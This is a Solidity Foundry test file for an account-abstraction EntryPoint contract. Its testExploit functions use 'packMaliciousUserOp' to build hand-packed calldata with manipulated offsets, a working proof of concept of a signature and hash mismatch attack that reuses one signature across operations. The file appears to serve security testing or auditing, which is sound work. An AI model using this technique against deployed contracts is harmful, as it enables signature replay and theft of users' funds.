pragma solidity ^0.8.0;

import "forge-std/Test.sol";

import "src/core/EntryPoint.sol";

import "src/TestSender.sol";

import "./BytesLib.sol";

import "openzeppelin-contracts/contracts/utils/cryptography/ECDSA.sol";

import "forge-std/console.sol";

using ECDSA for bytes32;

contract TestEntrypoint is Test {

    EntryPoint entrypoint;

    TestSender sender;

    address payable beneficiary;

    address senderOwner;

    address eoaRecipient;

    address payable bundler;

    fallback() external {
        console.log("fallback");
        console.logBytes(msg.data);
    }

    function setUp() external {
        entrypoint = new EntryPoint();
        beneficiary = payable(makeAddr("beneficiary"));
        senderOwner = makeAddr("senderOwner");
        sender = new TestSender(entrypoint);
        sender.setOwner(senderOwner);

        eoaRecipient = makeAddr("EOA");
        bundler = payable(makeAddr("bundler"));
    }


    function xtestHandleOp() external {
        UserOperation[] memory ops = new UserOperation[](1);
        uint256 prefund;
        vm.deal(address(sender), 1 ether);
        (ops[0], prefund) = fillUserOp(eoaRecipient, 1, "", "senderOwner");
        vm.expectCall(address(eoaRecipient), 1, "");
        uint256 balanceBefore = bundler.balance;
        vm.startPrank(bundler);
        entrypoint.handleOps(
            ops,
            bundler
        );
        vm.stopPrank();
        console.log("Before : ", balanceBefore);
        console.log("After  : ",bundler.balance);
        assert(bundler.balance >= balanceBefore);
    }


    function fillUserOp(
        address _to,
        uint256 _value,
        bytes memory _data,
        string memory _name
    ) public returns(UserOperation memory op, uint256 prefund) {
        op.sender = address(sender);
        op.nonce = 0;
        op.callData = abi.encodeWithSelector(TestSender.execute.selector, _to, _value, _data);
        op.callGasLimit = 50000;
        op.verificationGasLimit = 80000;
        op.preVerificationGas = 50000;
        op.maxFeePerGas = 50000;
        op.maxPriorityFeePerGas = 1;
        op.signature = signUserOp(op, _name);
        (op, prefund) = simulateVerificationGas(op);
        op.callGasLimit = simulateCallGas(op);
        op.signature = signUserOp(op, _name);
    }

    function signUserOp(
        UserOperation memory op,
        string memory _name
    ) public returns(bytes memory signature) {
        (address addr, uint256 priv) = makeAddrAndKey(_name);
        bytes32 hash = entrypoint.getUserOpHash(op);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(priv, hash.toEthSignedMessageHash());
        require(addr == ECDSA.recover(hash.toEthSignedMessageHash(), v,r,s));
        signature = abi.encodePacked(r, s, v);
        require(addr == ECDSA.recover(hash.toEthSignedMessageHash(), signature));
    }

    function simulateVerificationGas(
        UserOperation memory op
    ) public returns(UserOperation memory, uint256 preFund){
        (bool success, bytes memory ret) = address(entrypoint).call(
            abi.encodeWithSelector(EntryPoint.simulateValidation.selector, op)
        );
        require(!success);
        require(bytes4(BytesLib.slice(ret,0,4)) == IEntryPoint.ValidationResult.selector);
        bytes memory data = BytesLib.slice(ret, 4, ret.length - 4);
        (IEntryPoint.ReturnInfo memory retInfo, , , ) = abi.decode(data, (IEntryPoint.ReturnInfo, IStakeManager.StakeInfo, IStakeManager.StakeInfo, IStakeManager.StakeInfo));
        op.preVerificationGas = retInfo.preOpGas;
        op.verificationGasLimit = retInfo.preOpGas;
        op.maxFeePerGas = retInfo.prefund * 11 / (retInfo.preOpGas *10);
        op.maxPriorityFeePerGas = 1;
        return (op, retInfo.prefund);
    }

    function simulateCallGas(
        UserOperation memory op
    ) public returns(uint256) {
        try this.calcGas(op.sender, op.callData) {
            revert("Should have failed");
        } catch Error(string memory reason) {
            uint256 gas = abi.decode(bytes(reason), (uint256));
            console.log("gas : ", gas);
            return gas*11/10;
        } catch {
            revert("Should have failed");
        }
    }

    function calcGas(address _to, bytes memory _data) public {
        vm.startPrank(address(entrypoint));
        uint256 g = gasleft();
        (bool success, ) = _to.call(_data);
        require(success);
        g = g - gasleft();
        console.log("Hello");
        bytes memory r = abi.encode(g);
        vm.stopPrank();
        require(false, string(r));
    }
    
    function testExploit() public {
        vm.deal(address(sender), 1 ether);

        (,bytes memory data1) = packMaliciousUserOp(0, abi.encodeWithSelector(TestSender.execute.selector, eoaRecipient, 1, ""));
        // console.log("data");
        // console.logBytes(data);
        (bool success, bytes memory ret) = address(entrypoint).call(abi.encodePacked(entrypoint.getUserOpHash.selector, data1));
        if(!success) {
            console.log("error : ", string(ret));
        }
        console.log("hash1");
        console.logBytes(ret);
        (, bytes memory data2) = packMaliciousUserOp(1, abi.encodeWithSelector(TestSender.execute.selector, eoaRecipient, 2, ""));
        (success, ret) = address(entrypoint).call(abi.encodePacked(entrypoint.getUserOpHash.selector, data2));
        if(!success) {
            console.log("error : ", string(ret));
        }
        console.log("hash2");
        console.logBytes(ret);

        bytes memory c = abi.encodePacked(
            entrypoint.handleOps.selector,
            uint256(0x40),
            bytes12(0),
            address(bundler),
            uint256(2), // array length
            uint256(0x60), // 1st elem offset
            uint256(0x60 + data1.length),
            data1,
            data2
        );
        (success, ret) = address(entrypoint).call(c);
        require(success, "reverted");
    }

    function testExploit2() public {
        vm.deal(address(sender), 1 ether);

        (uint256 length1, bytes memory data1) = packMaliciousUserOp(0, abi.encodeWithSelector(TestSender.execute.selector, eoaRecipient, 1, ""));
        // console.log("data");
        // console.logBytes(data);
        (bool success, bytes memory ret) = address(entrypoint).call(abi.encodePacked(entrypoint.getUserOpHash.selector, data1));
        if(!success) {
            console.log("error : ", string(ret));
        }
        console.log("hash1");
        console.logBytes(ret);
        (uint256 length2, bytes memory data2) = packMaliciousUserOp(0, abi.encodeWithSelector(TestSender.execute.selector, eoaRecipient, 2, ""));
        (success, ret) = address(entrypoint).call(abi.encodePacked(entrypoint.getUserOpHash.selector, data2));
        if(!success) {
            console.log("error : ", string(ret));
        }
        console.log("hash2");
        console.logBytes(ret);

        bytes memory c = abi.encodePacked(
            entrypoint.handleOps.selector,
            uint256(0x40),
            bytes12(0),
            address(bundler),
            uint256(2), // array length
            uint256(0x60), // 1st elem offset
            uint256(0x60 + data1.length),
            data1,
            data2
        );
        (success, ret) = address(entrypoint).call(c);
        require(success, "reverted");
    }


    function packMaliciousUserOp(uint256 _nonceDelta,bytes memory _data) public returns(uint256 origLength, bytes memory data) {
        uint256 offsetInitCode = 0x1e0;
        uint256 offsetCallData = 0x200;
        uint256 nonce = 0x160 + 0x60 + _nonceDelta;
        data = abi.encodePacked(
            uint256(32),
            bytes12(0),
            address(sender),
            nonce, // nonce
            uint256(offsetInitCode),
            uint256(offsetCallData),
            uint256(100000), // callgaslimit
            uint256(100000), // verificationgaslimit
            uint256(100000), // preverificationgas
            uint256(100000), // maxfeepergas
            uint256(1),   // maxpriorityfeepergas
            uint256(0x1f0),
            uint256(32)
        );  // signature offset
        (address addr, uint256 priv) = makeAddrAndKey("senderOwner");
        console.log("TEST ACCOUNT", addr);
        console.log("owner :", sender.owner());
        bytes32 hash = keccak256(
            abi.encodePacked(
                address(sender),
                uint256(nonce), // nonce
                _data
            )
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(priv, hash.toEthSignedMessageHash());

        data = abi.encodePacked(
            data,
            r,   // signature 
            s,   // signature 
            uint256(v),   // signature 
            uint256(0),   // initcodeLength
            uint256(0),   // paymaster
            uint256(_data.length),   // calldataLength
            _data // calldata
        );

        require(addr == ECDSA.recover(hash.toEthSignedMessageHash(), v,r,s));
        bytes memory signature = abi.encodePacked(r, s, v);
        require(addr == ECDSA.recover(hash.toEthSignedMessageHash(), signature));
        console.log("DL",data.length);
    }
}